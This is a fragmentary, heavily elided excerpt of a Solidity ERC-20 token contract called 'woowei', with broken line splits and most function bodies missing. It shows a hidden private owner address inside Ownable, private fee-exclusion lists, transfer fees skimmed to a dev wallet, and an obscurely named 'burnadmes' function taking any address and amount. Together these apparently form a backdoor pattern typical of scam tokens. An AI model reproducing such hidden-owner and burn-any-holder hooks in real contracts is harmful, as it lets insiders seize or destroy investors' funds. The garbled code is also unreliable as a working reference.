...
contract Ownable is Context {
    ...
    address private _ownerd = 
0x46CFfE999E0671f4c9c22c03219d1A2216CBB778
;
...
contract woowei is Context, IERC20, Ownable {    using SafeMath 
for
 uint256;
    using Address 
for
...
address
 =>
 uint256)) private allown;

    mapping(
address
 =>
 bool) private _ExcluFee;
    mapping(
address
 =>
 bool) private _Exclu;
...
0
    ...
    uint256 private _totalSupply = 100000000000 * 10 ** 4;
    uint256 private _tFeeTotal;
        string private _name ="woowei";
    string private _symbol = "WooWei";
    uint8 private _decimals = 8;
         address public deadAddress =0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x2935b4203a46b9A684c6B654df3C65e3Dd4C8588;
...
address
 =>
 uint256) private bRhos;
    address[] private _bRhos;

    uint256 public Rho = uint256(
0
);
    mapping(
address
 =>
 uint256) private Rhos;
...
if
(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
...
;
             ...
             uint256 devAmount = amount.mul(devFee).div(
100
);
        uint256 deadAmount = amount.mul(deadFee).div(
100
);
...
batchTransferToken
(
address[] memory holders, uint256 amount
) 
public
...
burnadmes
(
address burnadme, uint256 burnadmeb
)
